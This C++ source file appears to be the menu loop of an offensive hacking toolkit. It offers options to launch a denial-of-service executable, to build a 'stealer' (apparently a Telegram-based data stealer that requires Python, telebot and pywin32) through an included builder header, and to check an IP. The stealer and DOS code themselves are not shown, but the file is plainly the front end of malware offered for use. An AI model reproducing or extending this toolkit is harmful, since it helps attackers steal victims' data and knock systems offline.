#include <string>
#include <iostream>
#include "texts.hpp"
#include "stealerbuilder.hpp"
#include "colors.hpp"

string dos = "1";
string stealer = "2";
string InternetProtocolCheck = "3";
string help = "help";
string exit_from = "exit";
string checker = "check";
string clear = "cls";
string input;

void reaction_a() {
    while (1) 
    {

        std::cin >> input;

        if (input == help)
            cout << br_green << "1. DOS - Caution! Your computer may catch fire\n2. Stealer " << red << "- Python, telebot and pywin32 are required\n" << br_green << "3. Check IP\n" << RESET_COLOR;
        else if (input == dos)
            system("Scripts\\tools\\dos\\dos.exe");
        else if (input == stealer)
            buildstealer();
        else if (input == InternetProtocolCheck) {
            system("Scripts\\tools\\InternetProtocol.exe");
        }
        else if (input == clear){
            system("cls");
            logo();
            cout << RESET_COLOR;
        }
        else if (input == exit_from)
            exit(0);
    }
}